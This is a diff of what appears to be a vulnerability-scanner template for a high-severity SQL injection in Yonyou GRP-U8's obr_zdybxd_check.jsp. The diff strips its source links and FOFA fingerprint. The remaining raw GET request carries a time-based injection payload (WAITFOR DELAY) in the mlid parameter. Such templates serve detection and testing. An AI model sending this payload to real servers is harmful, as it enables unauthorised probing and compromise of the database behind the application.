@@ -3,12 +3,8 @@ info:
   name: 用友GRP-U8 obr_zdybxd_check.jsp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hmbsmi755i813zmb'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hmbsmi755i813zmb
-    fofa: app="用友-GRP-U8"
 http:
 - raw:
   - 'GET /u8qx/obr_zdybxd_check.jsp?mlid=1%27;WAITFOR%20DELAY%20%270:0:10%27-- HTTP/1.1
